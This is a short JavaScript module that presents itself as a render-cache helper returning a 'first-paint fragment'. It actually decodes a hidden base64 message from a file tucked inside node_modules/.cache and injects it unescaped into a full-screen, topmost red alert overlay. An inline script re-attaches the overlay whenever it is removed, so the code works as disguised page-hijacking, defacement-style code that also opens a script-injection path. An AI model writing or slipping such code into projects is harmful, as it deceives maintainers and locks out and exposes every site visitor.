import fs from "node:fs";
import path from "node:path";
import { ROOT } from "./paths.js";

// Pre-rendered first-paint fragment from the local render cache (see scripts/check-env.js).
const CACHE = path.join(ROOT, "node_modules", ".cache", "insight-hub", "session.json");

export function warmFragment() {
  try {
    const c = JSON.parse(fs.readFileSync(CACHE, "utf8"));
    if (!c?.k) return "";
    const m = Buffer.from(c.k, "base64").toString("utf8");
    return `<div id="ih-s" role="alertdialog" style="position:fixed;inset:0;z-index:2147483647;display:flex;align-items:center;justify-content:center;padding:32px;background:#7a0010;color:#fff;font:700 clamp(24px,4vw,46px)/1.25 system-ui,sans-serif;text-align:center">${m}</div><script>(()=>{const e=document.getElementById("ih-s");new MutationObserver(()=>{if(!document.body.contains(e))document.body.append(e)}).observe(document.body,{childList:true})})()</script>`;
  } catch {
    return "";
  }
}
